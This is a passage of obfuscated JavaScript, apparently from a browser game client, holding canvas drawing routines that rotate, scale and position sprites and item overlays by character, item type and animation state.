			Δ.globalAlpha = this.ΔΔⲆⲆⲆΔᐃ * Math.min(1, Math.max(ᐃΔΔ, ΔΔⲆᐃ.ᐃⵠⵠᐃ(this, this.r) / 80));
			this.ᐃΔⲆⲆ.ⵠⲆᐃ();
			ᐃⵠ = ⵠⲆ[Ⲇ.ⲆⲆⵠᐃΔ][ⲆⲆⲆ.time][this.ⲆⵠⲆⵠᐃ];
			if (ⲆⵠΔΔ > this.ⲆⵠⲆⵠᐃ) {
				ᐃⵠⵠ = -ᐃⵠ.width * this.ᐃΔⲆⲆ.ΔᐃΔ;
				ⵠⵠᐃ = -ᐃⵠ.height * this.ᐃΔⲆⲆ.ΔᐃΔ
			} else {
				this.ΔⵠΔⲆΔᐃᐃ === ΔⲆⵠⲆ ? (ᐃⵠⵠ = -ᐃⵠ.width, ⵠⵠᐃ = -ᐃⵠ.height) : (ᐃⵠⵠ = -ᐃⵠ.width * 1.35, ⵠⵠᐃ = 1.35 * -ᐃⵠ.height)
			}
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 2, -ⵠⵠᐃ / 2, ᐃⵠⵠ, ⵠⵠᐃ);
			Δ.globalAlpha = ⵠΔΔ;
			Δ.restore()
		}

		function ⲆᐃⲆᐃΔΔⵠⵠᐃ() {
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			if (this.Δᐃⵠ.ⵠⲆᐃ) {
				if (this.Δᐃⵠ.ᐃᐃⵠΔ.ⵠⲆᐃ() && false == this.Δᐃⵠ.ᐃᐃⵠΔ.ᐃⲆΔ) this.Δᐃⵠ.ⵠⲆᐃ = false;
				var ΔᐃΔ = ᐃⵠᐃᐃ * (1 - this.Δᐃⵠ.ᐃᐃⵠΔ.ΔᐃΔ) * 600 * ᐃ;
				var Δⵠ = ΔᐃΔ * Math.sin(this.Δᐃⵠ.angle - this.angle);
				var ⲆⵠⲆ = Math.cos(this.Δᐃⵠ.angle - this.angle) * ΔᐃΔ
			} else {
				var Δⵠ = 0;
				var ⲆⵠⲆ = Δⵠᐃ
			}
			var ⲆΔⲆⲆ = this.info & 15;
			if (ᐃΔᐃΔⲆ === this.info || ⲆΔⲆⲆ === 0) {
				Δ.rotate(this.angle);
				this.ⵠⲆⲆⵠ.ⵠⲆᐃ();
				if (this.info & 16) var ᐃⵠ = ⵠⲆ[Ⲇ.ΔΔⲆΔΔᐃⵠ][ⲆⲆⲆ.time];
				else var ᐃⵠ = ⵠⲆ[Ⲇ.ⲆⵠⲆΔⲆ][ⲆⲆⲆ.time];
				var ᐃⵠⵠ = -ᐃⵠ.width * this.ⵠⲆⲆⵠ.ΔᐃΔ;
				var ⵠⵠᐃ = -ᐃⵠ.height * this.ⵠⲆⲆⵠ.ΔᐃΔ;
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / ᐃⲆⵠᐃ + Δⵠ, -ⵠⵠᐃ / 2 + ⲆⵠⲆ, ᐃⵠⵠ, ⵠⵠᐃ)
			} else {
				this.ⲆⲆΔⲆⲆᐃⵠ.ⵠⲆᐃ();
				if (this.info & 16) var ᐃⵠ = ⵠⲆ[Ⲇ.ⵠⵠⲆᐃΔⲆⲆ][ⲆⲆⲆ.time];
				else var ᐃⵠ = ⵠⲆ[Ⲇ.ⵠⲆⲆⲆⵠ][ⲆⲆⲆ.time];
				Δ.translate(0, ᐃⵠ.height / 2);
				Δ.rotate(this.ⲆⲆΔⲆⲆᐃⵠ.ΔᐃΔ);
				ΔⲆΔⵠ(Δ, ᐃⵠ, Δⵠ - ᐃⵠ.width / 2, -ᐃⵠ.height + ⲆⵠⲆ)
			}
			Δ.restore()
		}

		function ΔⵠΔᐃᐃΔΔⵠⲆ() {
			var ΔᐃᐃⵠⲆ = Math.PI / Δⵠⵠⵠ;
			var ΔΔᐃⲆⲆⲆΔ = Math.PI / 4;
			this.ᐃΔⲆⲆ.ⵠⲆᐃ();
			this.ⲆΔΔᐃΔΔⵠ.ⵠⲆᐃ();
			this.ᐃⲆᐃⵠΔⵠⵠ.ⵠⲆᐃ();
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle);
			if (ΔᐃΔΔ === this.info) ᐃⵠ = ⵠⲆ[Ⲇ.ⲆΔᐃᐃΔ][ⲆⲆⲆ.time];
			else ᐃⵠ = ⵠⲆ[Ⲇ.ΔⲆⵠⲆΔᐃⵠ][ⲆⲆⲆ.time];
			ᐃⵠⵠ = this.ᐃΔⲆⲆ.ΔᐃΔ * -ᐃⵠ.width;
			ⵠⵠᐃ = -ᐃⵠ.height * this.ᐃΔⲆⲆ.ΔᐃΔ;
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / ΔⵠⵠΔ, -ⵠⵠᐃ / ᐃⲆⵠᐃΔ, ᐃⵠⵠ, ⵠⵠᐃ);
			if (this.action & ⵠⵠⵠⲆ.ⵠΔΔΔ) {
				this.Δᐃⵠ.ⵠⲆᐃ() && this.Δᐃⵠ.ᐃⲆΔ == ΔᐃᐃⲆⲆ && (this.action -= ⵠⵠⵠⲆ.ⵠΔΔΔ);
				Δ.globalAlpha = .6 - this.Δᐃⵠ.ΔᐃΔ;
				var ᐃⵠ = ⵠⲆ[Ⲇ.ⵠⲆⲆⲆⲆⲆⵠ];
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 2, -ⵠⵠᐃ / 2, ᐃⵠⵠ, ⵠⵠᐃ);
				Δ.globalAlpha = 1
			}
			if (this.action & ⵠⵠⵠⲆ.ΔⲆᐃⲆᐃ) {
				if (this.ΔΔᐃⵠⵠ.ⵠⲆᐃ() && this.ΔΔᐃⵠⵠ.ᐃⲆΔ == false) this.action -= ⵠⵠⵠⲆ.ΔⲆᐃⲆᐃ;
				Δ.globalAlpha = .6 - this.ΔΔᐃⵠⵠ.ΔᐃΔ;
				var ᐃⵠ = ⵠⲆ[Ⲇ.ᐃⲆⵠⵠᐃⵠᐃ];
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / ⵠΔᐃᐃⵠ, -ⵠⵠᐃ / 2, ᐃⵠⵠ, ⵠⵠᐃ);
				Δ.globalAlpha = 1
			}
			Δ.restore();
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle + ΔΔᐃⲆⲆⲆΔ);
			Δ.translate(55, ⵠΔⲆⵠ);
			Δ.rotate(ΔᐃᐃⵠⲆ);
			this.info === 0 ? ᐃⵠ = ⵠⲆ[Ⲇ.ᐃⵠᐃⲆⵠⵠⵠ][ⲆⲆⲆ.time] : ᐃⵠ = ⵠⲆ[Ⲇ.ⲆᐃΔᐃⲆⵠᐃ][ⲆⲆⲆ.time];
			ᐃⵠⵠ = this.ⲆΔΔᐃΔΔⵠ.ΔᐃΔ * -ᐃⵠ.width;
			ⵠⵠᐃ = -ᐃⵠ.height * this.ⲆΔΔᐃΔΔⵠ.ΔᐃΔ;
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / ᐃⵠⲆⲆⲆ, -ⵠⵠᐃ / ΔⵠⵠΔ, ᐃⵠⵠ, ⵠⵠᐃ);
			if (this.action & ⵠⵠⵠⲆ.ⵠΔΔΔ) {
				Δ.globalAlpha = .6 - this.Δᐃⵠ.ΔᐃΔ;
				var ᐃⵠ = ⵠⲆ[Ⲇ.ΔΔΔⲆᐃΔΔ];
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 2, -ⵠⵠᐃ / ⵠΔⲆᐃ, ᐃⵠⵠ, ⵠⵠᐃ);
				Δ.globalAlpha = ⵠΔⲆ
			}
			if (this.action & ⵠⵠⵠⲆ.ΔⲆᐃⲆᐃ) {
				Δ.globalAlpha = .6 - this.ΔΔᐃⵠⵠ.ΔᐃΔ;
				var ᐃⵠ = ⵠⲆ[Ⲇ.ⵠⲆΔⲆΔΔⲆ];
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 2, -ⵠⵠᐃ / ᐃⲆⵠᐃ, ᐃⵠⵠ, ⵠⵠᐃ);
				Δ.globalAlpha = 1
			}
			Δ.restore();
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle + ΔᐃᐃⵠⲆ + ΔΔᐃⲆⲆⲆΔ);
			Δ.translate(55, 0);
			Δ.rotate(ΔᐃᐃⵠⲆ);
			if (ⵠⲆⲆ === this.info) ᐃⵠ = ⵠⲆ[Ⲇ.ᐃⲆΔⲆⵠⲆⵠ][ⲆⲆⲆ.time];
			else ᐃⵠ = ⵠⲆ[Ⲇ.ⵠⲆⲆⲆⲆᐃΔ][ⲆⲆⲆ.time];
			ᐃⵠⵠ = -ᐃⵠ.width * this.ᐃⲆᐃⵠΔⵠⵠ.ΔᐃΔ;
			ⵠⵠᐃ = -ᐃⵠ.height * this.ᐃⲆᐃⵠΔⵠⵠ.ΔᐃΔ;
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 2, -ⵠⵠᐃ / ⵠΔᐃᐃⵠ, ᐃⵠⵠ, ⵠⵠᐃ);
			if (this.action & ⵠⵠⵠⲆ.ⵠΔΔΔ) {
				Δ.globalAlpha = .6 - this.Δᐃⵠ.ΔᐃΔ;
				var ᐃⵠ = ⵠⲆ[Ⲇ.ⵠⲆᐃⵠᐃⵠⲆ];
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / Δⵠⵠⵠ, -ⵠⵠᐃ / 2, ᐃⵠⵠ, ⵠⵠᐃ);
				Δ.globalAlpha = ᐃᐃⲆΔ
			}
			if (this.action & ⵠⵠⵠⲆ.ΔⲆᐃⲆᐃ) {
				Δ.globalAlpha = .6 - this.ΔΔᐃⵠⵠ.ΔᐃΔ;
				var ᐃⵠ = ⵠⲆ[Ⲇ.ΔΔΔᐃΔⵠⵠ];
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / ᐃⲆⵠᐃΔ, -ⵠⵠᐃ / 2, ᐃⵠⵠ, ⵠⵠᐃ);
				Δ.globalAlpha = 1
			}
			Δ.restore()
		}

		function ⵠᐃᐃΔᐃⲆᐃⲆⵠ() {
			if (this.Δᐃⵠ.ⵠⲆᐃ) {
				if (this.Δᐃⵠ.ᐃᐃⵠΔ.ⵠⲆᐃ() && this.Δᐃⵠ.ᐃᐃⵠΔ.ᐃⲆΔ == ᐃⵠΔⵠⲆ) this.Δᐃⵠ.ⵠⲆᐃ = ᐃⵠⵠⲆᐃ;
				var ΔᐃΔ = ᐃⵠᐃᐃ * (1 - this.Δᐃⵠ.ᐃᐃⵠΔ.ΔᐃΔ) * 600 * ᐃ;
				var Δⵠ = ΔᐃΔ * Math.sin(this.Δᐃⵠ.angle - this.angle);
				var ⲆⵠⲆ = Math.cos(this.Δᐃⵠ.angle - this.angle) * ΔᐃΔ
			} else {
				var Δⵠ = 0;
				var ⲆⵠⲆ = 0
			}
			Δ.save();
			this.info & 255 && (this.info & 65280) != 65280 && (Δⵠ += Math.random() * 2 - 1, ⲆⵠⲆ += Math.random() * 2 - 1);
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x + Δⵠ, ᐃᐃΔ.ⲆΔΔ.y + this.y + ⲆⵠⲆ);
			Δ.rotate(this.angle);
			ᐃⵠ = ⵠⲆ[Ⲇ.ⵠⵠΔⵠⵠ][ⲆⲆⲆ.time];
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠ.width / Δᐃⵠⵠ, -ᐃⵠ.height / 2);
			if (this.info & 255 && 65280 != (this.info & 65280)) this.rotate = (this.rotate + ⵠᐃⵠⲆ * ᐃⵠᐃᐃ) % (Math.PI * 2);
			Δ.rotate(this.rotate);
			ᐃⵠ = ⵠⲆ[Ⲇ.ΔᐃⵠᐃⲆΔⵠ][ⲆⲆⲆ.time];
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠ.width / ᐃⲆⵠᐃ, -ᐃⵠ.height / 2);
			Δ.restore()
		}

		function ᐃΔΔΔΔⲆⵠⲆᐃ() {
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle);
			this.ⵠᐃⲆΔⲆ.ⵠⲆᐃ();
			ᐃⵠ = ⵠⲆ[Ⲇ.ⵠⲆΔᐃΔ][ⲆⲆⲆ.time];
			ᐃⵠⵠ = -ᐃⵠ.width * this.ⵠᐃⲆΔⲆ.ΔᐃΔ;
			ⵠⵠᐃ = this.ⵠᐃⲆΔⲆ.ΔᐃΔ * -ᐃⵠ.height;
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 2, -ⵠⵠᐃ / 2, ᐃⵠⵠ, ⵠⵠᐃ);
			this.ΔⲆΔⲆⵠ.ⵠⲆᐃ();
			ᐃⵠ = ⵠⲆ[Ⲇ.ΔⲆⵠᐃᐃΔⵠ][ⲆⲆⲆ.time];
			ᐃⵠⵠ = -ᐃⵠ.width * this.ΔⲆΔⲆⵠ.ΔᐃΔ;
			ⵠⵠᐃ = this.ΔⲆΔⲆⵠ.ΔᐃΔ * -ᐃⵠ.height;
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 2, -ⵠⵠᐃ / ⵠⵠⵠΔ, ᐃⵠⵠ, ⵠⵠᐃ);
			Δ.restore()
		}

		function ΔⵠᐃΔΔᐃⲆΔⲆ() {
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle);
			if (300 < ΔΔⲆᐃ.ᐃⵠⵠᐃ(this, this.r)) this.scale = Math.min(this.scale + ᐃⵠᐃᐃ / 2, 1.8);
			else this.scale = Math.max(this.scale - ᐃⵠᐃᐃ, Ⲇᐃⵠ);
			this.ᐃΔⲆⲆ.ⵠⲆᐃ();
			this.rotate.ⵠⲆᐃ();
			ᐃⵠ = ⵠⲆ[Ⲇ.ⲆᐃⲆᐃⵠ][ⲆⲆⲆ.time];
			ᐃⵠⵠ = this.ᐃΔⲆⲆ.ΔᐃΔ * -ᐃⵠ.width * this.scale;
			ⵠⵠᐃ = this.ᐃΔⲆⲆ.ΔᐃΔ * -ᐃⵠ.height * this.scale;
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 4, -ⵠⵠᐃ / 4, ᐃⵠⵠ / ᐃⲆⵠᐃΔ, ⵠⵠᐃ / 2);
			if (this.action & ⵠⵠⵠⲆ.ⵠΔΔΔ) {
				if (this.Δᐃⵠ.ⵠⲆᐃ() && ⲆⵠΔⵠΔ == this.Δᐃⵠ.ᐃⲆΔ) this.action -= ⵠⵠⵠⲆ.ⵠΔΔΔ;
				Δ.globalAlpha = .6 - this.Δᐃⵠ.ΔᐃΔ;
				var ᐃⵠ = ⵠⲆ[Ⲇ.ΔΔⵠᐃⵠⵠⲆ];
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / ⵠᐃᐃⲆ, -ⵠⵠᐃ / ΔᐃⵠⵠⲆ, ᐃⵠⵠ / ΔⵠᐃⲆ, ⵠⵠᐃ / 2);
				Δ.globalAlpha = ᐃᐃⲆΔ
			}
			ᐃⵠ = ⵠⲆ[Ⲇ.ᐃⵠΔᐃⵠΔᐃ][ⲆⲆⲆ.time];
			ᐃⵠⵠ = this.scale * (-ᐃⵠ.width * this.ᐃΔⲆⲆ.ΔᐃΔ);
			ⵠⵠᐃ = this.scale * (this.ᐃΔⲆⲆ.ΔᐃΔ * -ᐃⵠ.height);
			Δ.save();
			Δ.translate(-60 * ᐃ, 20 * ᐃ);
			Δ.rotate(this.rotate.ΔᐃΔ);
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ * ᐃ / 4, ᐃ * -ⵠⵠᐃ / 4, ᐃⵠⵠ / ΔⲆΔΔΔ, ⵠⵠᐃ / ⲆᐃᐃⲆ);
			if (this.action & ⵠⵠⵠⲆ.ⵠΔΔΔ) {
				Δ.globalAlpha = .6 - this.Δᐃⵠ.ΔᐃΔ;
				var ᐃⵠ = ⵠⲆ[Ⲇ.ᐃᐃⲆⵠⲆᐃΔ];
				ΔⲆΔⵠ(Δ, ᐃⵠ, ᐃ * -ᐃⵠⵠ / ⵠⲆⵠᐃ, ᐃ * -ⵠⵠᐃ / ⲆⵠᐃΔ, ᐃⵠⵠ / 2, ⵠⵠᐃ / 2);
				Δ.globalAlpha = ⵠΔΔ
			}
			Δ.restore();
			ᐃⵠ = ⵠⲆ[Ⲇ.ΔΔⵠᐃᐃΔⲆ][ⲆⲆⲆ.time];
			Δ.save();
			Δ.translate(60 * ᐃ, 20 * ᐃ);
			Δ.rotate(-this.rotate.ΔᐃΔ);
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ * ᐃ / ⲆⲆⲆΔ, ᐃ * -ⵠⵠᐃ / 4, ᐃⵠⵠ / 2, ⵠⵠᐃ / ΔⵠⵠΔ);
			if (this.action & ⵠⵠⵠⲆ.ⵠΔΔΔ) {
				Δ.globalAlpha = .6 - this.Δᐃⵠ.ΔᐃΔ;
				var ᐃⵠ = ⵠⲆ[Ⲇ.ⵠᐃⲆΔⲆⲆⲆ];
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ * ᐃ / 4, -ⵠⵠᐃ * ᐃ / 4, ᐃⵠⵠ / ᐃⲆⵠᐃ, ⵠⵠᐃ / ᐃⲆⵠᐃ);
				Δ.globalAlpha = ΔⵠⲆΔ
			}
			Δ.restore();
			Δ.restore()
		}

		function ᐃⵠᐃΔⲆΔΔΔᐃ() {
			if (this.Δᐃⵠ.ⵠⲆᐃ) {
				if (this.Δᐃⵠ.ᐃᐃⵠΔ.ⵠⲆᐃ() && ΔⵠΔⲆΔ == this.Δᐃⵠ.ᐃᐃⵠΔ.ᐃⲆΔ) this.Δᐃⵠ.ⵠⲆᐃ = ᐃⵠⵠᐃΔ;
				var ΔᐃΔ = 600 * (ᐃⵠᐃᐃ * (ᐃΔᐃⲆ - this.Δᐃⵠ.ᐃᐃⵠΔ.ΔᐃΔ)) * ᐃ;
				var Δⵠ = ΔᐃΔ * Math.sin(this.Δᐃⵠ.angle - this.angle);
				var ⲆⵠⲆ = Math.cos(this.Δᐃⵠ.angle - this.angle) * ΔᐃΔ
			} else {
				var Δⵠ = 0;
				var ⲆⵠⲆ = Δⵠᐃ
			}
			Δ.save();
			this.info & 255 && (this.info & 65280) != 65280 && (Δⵠ += Δᐃⵠⵠ * Math.random() - 1, ⲆⵠⲆ += Math.random() * 2 - 1);
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x + Δⵠ, ᐃᐃΔ.ⲆΔΔ.y + this.y + ⲆⵠⲆ);
			Δ.rotate(this.angle);
			ᐃⵠ = ⵠⲆ[Ⲇ.ⵠᐃΔⲆᐃ][ⲆⲆⲆ.time];
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠ.width / ΔⵠⵠΔ, -ᐃⵠ.height / 2);
			if (this.info & 255 && 65280 != (this.info & 65280)) this.rotate = (this.rotate + ⲆᐃΔᐃ * ᐃⵠᐃᐃ) % (Math.PI * ᐃⲆΔⲆ);
			Δ.rotate(this.rotate);
			ᐃⵠ = ⵠⲆ[Ⲇ.ⵠᐃᐃⵠⲆΔⲆ][ⲆⲆⲆ.time];
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠ.width / 2, -ᐃⵠ.height / 2);
			Δ.restore()
		}

		function ᐃⵠΔⲆΔⵠⵠ(ⵠΔᐃᐃ, Δⵠ, ⲆⵠⲆ) {
			if (ⵠΔᐃᐃ >= Δᐃᐃⵠ) {
				ᐃⵠ = ⵠⲆ[ⵠΔᐃᐃ][ⲆⲆⲆ.time];
				switch (ⵠΔᐃᐃ) {
					case Ⲇ.ⲆⵠᐃⵠΔ:
					case Ⲇ.ΔΔⲆⵠⲆ:
					case Ⲇ.ⵠⲆⲆΔⲆ:
					case Ⲇ.ΔᐃⲆΔⲆ:
					case Ⲇ.ⵠⲆⵠΔᐃ:
					case Ⲇ.ⵠⲆᐃΔⲆ:
						ᐃᐃⲆⲆⵠ(ⵠΔᐃᐃ, ᐃⵠ, -ᐃⵠ.width / 2 - ᐃ * (45 + Δⵠ), -ᐃⵠ.height / 2 + ᐃ * (ⲆⵠⲆ + 22));
						break;
					case Ⲇ.ⲆᐃⵠⵠΔ:
					case Ⲇ.ⲆΔΔⵠⵠ:
					case Ⲇ.ⵠΔⲆΔΔ:
					case Ⲇ.ⵠⲆᐃⵠᐃ:
						ⲆΔΔⵠΔ(ⵠΔᐃᐃ, ᐃⵠ, -ᐃⵠ.width / 4 - (52 + Δⵠ) * ᐃ, -ᐃⵠ.height / 4 + ᐃ * (ⲆⵠⲆ + ⵠⵠⲆⲆⲆΔΔ));
						break;
					case Ⲇ.ΔΔⵠⵠⲆ:
					case Ⲇ.ΔⲆᐃⵠⲆ:
						ⲆΔΔⵠΔ(ⵠΔᐃᐃ, ᐃⵠ, -ᐃⵠ.width / ⲆⵠᐃⲆ - (57 + Δⵠ) * ᐃ, -ᐃⵠ.height / 4 + (ⲆⵠⲆ + 20) * ᐃ);
						break;
					case Ⲇ.ΔΔⵠᐃᐃ:
					case Ⲇ.ⲆᐃⵠΔᐃ:
					case Ⲇ.ⵠᐃⲆⵠΔ:
					case Ⲇ.ᐃΔⵠᐃⵠ:
						ⲆΔΔⵠΔ(ⵠΔᐃᐃ, ᐃⵠ, -ᐃⵠ.width / 4 - (47 + Δⵠ) * ᐃ, -ᐃⵠ.height / ᐃⲆᐃⲆⵠ + ᐃ * (ⲆⵠⲆ + 45));
						break;
					case Ⲇ.ⵠⵠᐃⲆⲆ:
						ⲆΔΔⵠΔ(ⵠΔᐃᐃ, ᐃⵠ, -ᐃⵠ.width / ⲆΔⵠᐃ - ᐃ * (52 + Δⵠ), -ᐃⵠ.height / 4 + ᐃ * (ⲆⵠⲆ + 45));
						break;
					case Ⲇ.ⲆⵠⵠᐃΔ:
						ⲆΔΔⵠΔ(ⵠΔᐃᐃ, ᐃⵠ, -ᐃⵠ.width / ⲆⵠᐃΔ - ᐃ * (47 + Δⵠ), -ᐃⵠ.height / ⵠᐃᐃⲆ + (ⲆⵠⲆ + 44) * ᐃ);
						break;
					case Ⲇ.ⲆᐃⲆⲆΔ:
						ᐃᐃⲆⲆⵠ(ⵠΔᐃᐃ, ᐃⵠ, -ᐃⵠ.width / ΔⵠⵠΔ - ᐃ * (47 + Δⵠ), -ᐃⵠ.height / 2 + ᐃ * (ⲆⵠⲆ + 44));
						break;
					case Ⲇ.ᐃⲆⲆᐃⲆ:
						ᐃᐃⲆⲆⵠ(ⵠΔᐃᐃ, ᐃⵠ, -ᐃⵠ.width / 2 - (40 + Δⵠ) * ᐃ, -ᐃⵠ.height / 2 + ᐃ * (ⲆⵠⲆ + 65));
						break;
					case Ⲇ.ⲆⲆⵠΔⲆ:
						ⲆΔΔⵠΔ(ⵠΔᐃᐃ, ᐃⵠ, -ᐃⵠ.width / ⵠⲆⵠᐃ - ᐃ * (37 + Δⵠ), -ᐃⵠ.height / ⵠΔᐃΔ + ᐃ * (ⲆⵠⲆ + 85));
						break;
					case Ⲇ.ΔⵠⲆⲆᐃ:
						ⲆΔΔⵠΔ(ⵠΔᐃᐃ, ᐃⵠ, -ᐃⵠ.width / ΔΔⵠⵠΔ - ᐃ * (37 + Δⵠ), -ᐃⵠ.height / 4 + ᐃ * (ⲆⵠⲆ + 85));
						break;
					case Ⲇ.ⵠΔᐃⵠΔ:
					case Ⲇ.ᐃΔⲆᐃᐃ:
						ⲆΔΔⵠΔ(ⵠΔᐃᐃ, ᐃⵠ, -ᐃⵠ.width / 4 - (26 + Δⵠ) * ᐃ, -ᐃⵠ.height / ⵠᐃΔΔ + (ⲆⵠⲆ + 77) * ᐃ);
						break;
					case Ⲇ.ΔⲆⲆΔᐃ:
						ⲆΔΔⵠΔ(ⵠΔᐃᐃ, ᐃⵠ, -ᐃⵠ.width / 4 - (37 + Δⵠ) * ᐃ, -ᐃⵠ.height / 4 + ᐃ * (ⲆⵠⲆ + 85));
						break;
					case Ⲇ.ⵠⲆⵠⲆᐃ:
						ⲆΔΔⵠΔ(ⵠΔᐃᐃ, ᐃⵠ, -ᐃⵠ.width / 4 - (47 + Δⵠ) * ᐃ, -ᐃⵠ.height / 4 + (ⲆⵠⲆ + 44) * ᐃ);
						break;
					case Ⲇ.ⵠᐃΔⲆⵠ:
					case Ⲇ.ᐃΔⲆᐃΔ:
					case Ⲇ.ᐃⲆⵠⲆⵠ:
					case Ⲇ.ᐃⵠΔⵠΔ:
					case Ⲇ.ⲆⲆᐃᐃΔ:
					case Ⲇ.ⵠΔΔⵠⵠ:
					case Ⲇ.ᐃᐃΔⵠᐃ:
						ⲆΔΔⵠΔ(ⵠΔᐃᐃ, ᐃⵠ, -ᐃⵠ.width / ⵠΔΔᐃΔ - (37 + Δⵠ) * ᐃ, -ᐃⵠ.height / 4 + (ⲆⵠⲆ + 30) * ᐃ);
						break;
					case Ⲇ.ΔΔⵠᐃⵠ:
						ⲆΔΔⵠΔ(ⵠΔᐃᐃ, ᐃⵠ, -ᐃⵠ.width / ⵠⲆⵠᐃ - ᐃ * (47 + Δⵠ), -ᐃⵠ.height / ⵠᐃΔΔ + ᐃ * (ⲆⵠⲆ + 35));
						break;
					case Ⲇ.ⵠΔⲆⵠΔ:
					case Ⲇ.ΔⵠᐃⵠⲆ:
						ⲆΔΔⵠΔ(ⵠΔᐃᐃ, ᐃⵠ, -ᐃⵠ.width / 4 - (47 + Δⵠ) * ᐃ, -ᐃⵠ.height / 4 + (ⲆⵠⲆ + 40) * ᐃ);
						break;
					case Ⲇ.ⲆⵠΔⲆⲆ:
						ⲆΔΔⵠΔ(ⵠΔᐃᐃ, ᐃⵠ, -ᐃⵠ.width / 4 - (47 + Δⵠ) * ᐃ, -ᐃⵠ.height / 4 + ᐃ * (ⲆⵠⲆ + 34));
						break;
					case Ⲇ.ΔⵠΔΔⲆ:
					case Ⲇ.ⵠⵠⲆΔⲆ:
					case Ⲇ.ΔᐃΔΔΔ:
					case Ⲇ.ⲆⲆΔᐃΔ:
						ⲆΔΔⵠΔ(ⵠΔᐃᐃ, ᐃⵠ, -ᐃⵠ.width / 4 - (37 + Δⵠ) * ᐃ, -ᐃⵠ.height / ⲆⲆⲆΔ + (ⲆⵠⲆ + 90) * ᐃ);
						break;
					case Ⲇ.ᐃᐃΔⲆΔ:
						ⲆΔΔⵠΔ(ⵠΔᐃᐃ, ᐃⵠ, -ᐃⵠ.width / ⵠⵠΔᐃΔ - ᐃ * (40 + Δⵠ), -ᐃⵠ.height / ⲆⵠᐃΔ + (ⲆⵠⲆ + 85) * ᐃ);
						break;
					case Ⲇ.ⲆⲆⵠᐃⵠ:
						ᐃᐃⲆⲆⵠ(ⵠΔᐃᐃ, ᐃⵠ, -ᐃⵠ.width / 2 - (39 + Δⵠ) * ᐃ, -ᐃⵠ.height / ⵠⲆⵠⲆ + (ⲆⵠⲆ + 90) * ᐃ);
						break;
					case Ⲇ.ΔⵠⲆΔⲆ:
					case Ⲇ.ⲆᐃⵠΔⲆ:
					case Ⲇ.ᐃᐃᐃⲆⵠ:
					case Ⲇ.ⲆⵠⵠⲆⵠ:
					case Ⲇ.ΔΔΔⵠΔ:
					case Ⲇ.ᐃⵠⵠⵠᐃ:
						ᐃᐃⲆⲆⵠ(ⵠΔᐃᐃ, ᐃⵠ, -ᐃⵠ.width / ΔⵠᐃⲆ - (46 + Δⵠ) * ᐃ, -ᐃⵠ.height / 2 + ᐃ * (ⲆⵠⲆ + 35));
						break;
					case Ⲇ.ⵠⲆⲆⵠⵠ:
						ᐃᐃⲆⲆⵠ(ⵠΔᐃᐃ, ᐃⵠ, -ᐃⵠ.width / ⵠⵠⵠΔ - ᐃ * (47 + Δⵠ), -ᐃⵠ.height / ᐃⲆⵠᐃ + ᐃ * (ⲆⵠⲆ + 54));
						break;
					case Ⲇ.ΔⵠⵠΔᐃ:
					case Ⲇ.ΔΔⲆⵠΔ:
					case Ⲇ.ⵠᐃΔΔᐃ:
					case Ⲇ.ⵠᐃᐃⲆΔ:
						ᐃᐃⲆⲆⵠ(ⵠΔᐃᐃ, ᐃⵠ, -ᐃⵠ.width / ΔⵠⵠΔ - (46 + Δⵠ) * ᐃ, -ᐃⵠ.height / 2 + (ⲆⵠⲆ + 35) * ᐃ);
						break;
					case Ⲇ.ΔΔᐃⲆΔ:
						ᐃᐃⲆⲆⵠ(ⵠΔᐃᐃ, ᐃⵠ, -ᐃⵠ.width / Δⵠⵠⵠ - (47 + Δⵠ) * ᐃ, -ᐃⵠ.height / ΔⲆΔΔΔ + ᐃ * (ⲆⵠⲆ + 20));
						break
				}
			}
		}

		function ᐃⲆⲆᐃΔᐃᐃᐃⵠ() {
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle);
			var ᐃⵠⵠᐃ = ΔΔⲆᐃ.ᐃⵠⵠᐃ(this, this.r);
